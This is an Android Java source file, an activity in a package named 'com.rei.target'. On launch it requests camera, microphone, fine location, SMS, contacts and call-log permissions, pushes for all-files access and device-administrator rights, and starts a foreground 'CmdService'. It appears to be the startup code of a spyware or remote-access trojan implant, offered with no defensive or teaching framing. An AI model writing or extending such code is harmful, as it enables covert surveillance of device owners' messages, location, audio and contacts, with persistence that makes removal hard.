package com.rei.target;
import android.*;
import android.app.admin.*;
import android.content.*;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.*;
import android.provider.Settings;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
public class MainActivity extends AppCompatActivity {
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);
        String[] p = {Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
            Manifest.permission.POST_NOTIFICATIONS};
        boolean n = false;
        for (String x : p) if (ContextCompat.checkSelfPermission(this, x) != PackageManager.PERMISSION_GRANTED) { n = true; break; }
        if (n) ActivityCompat.requestPermissions(this, p, 1001);
        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            try { startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName()))); } catch (Exception e) {}
        }
        ComponentName a = new ComponentName(this, AdminReceiver.class);
        DevicePolicyManager d = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (d != null && !d.isAdminActive(a)) {
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, a);
            startActivity(i);
        }
        Intent s = new Intent(this, CmdService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(s); else startService(s);
    }
}